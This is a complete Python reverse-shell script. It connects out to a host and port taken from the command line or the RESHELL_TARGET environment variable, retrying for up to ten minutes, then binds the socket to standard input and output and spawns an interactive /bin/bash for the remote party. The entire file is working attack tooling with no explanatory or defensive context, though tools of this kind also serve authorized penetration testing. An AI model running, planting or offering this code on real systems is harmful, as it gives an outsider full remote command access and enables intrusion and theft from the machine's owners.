#!/usr/bin/python

import os
import sys
import pty
import time
import socket


__version__ = '1.0.1'


def connect_to_target():
    if len(sys.argv) == 2:
        target = sys.argv[1]
    else:
        target = os.environ["RESHELL_TARGET"]
    host, port = target.split(':')
    port = int(port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    for minute in range(10):
        for second in range(0, 60, 10):
            try:
                sock.connect((host, port))
                return sock
            except socket.error:
                time.sleep(10)


def main():
    sock = connect_to_target()
    if sock:
        for channel in (0, 1, 2):
            os.dup2(sock.fileno(), channel)
        pty.spawn("/bin/bash")


if __name__ == '__main__':
    main()
